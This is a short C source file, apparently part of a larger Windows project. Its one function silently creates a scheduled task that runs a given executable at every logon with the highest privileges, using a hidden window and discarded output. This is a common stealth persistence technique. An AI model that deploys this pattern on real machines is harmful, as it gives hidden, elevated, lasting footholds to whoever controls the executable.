#include "../../include/common.h"

bool InstallScheduledTask(const char* execPath, const char* taskName) {
    char command[1024];
    snprintf(command, sizeof(command),
        "schtasks /create /tn \"%s\" /tr \"%s\" /sc onlogon /rl highest /f >nul 2>&1",
        taskName, execPath);

    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi;

    if (!CreateProcessA(NULL, command, NULL, NULL, FALSE, 
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        return false;
    }

    WaitForSingleObject(pi.hProcess, 5000);
    
    DWORD exitCode;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return (exitCode == 0);
}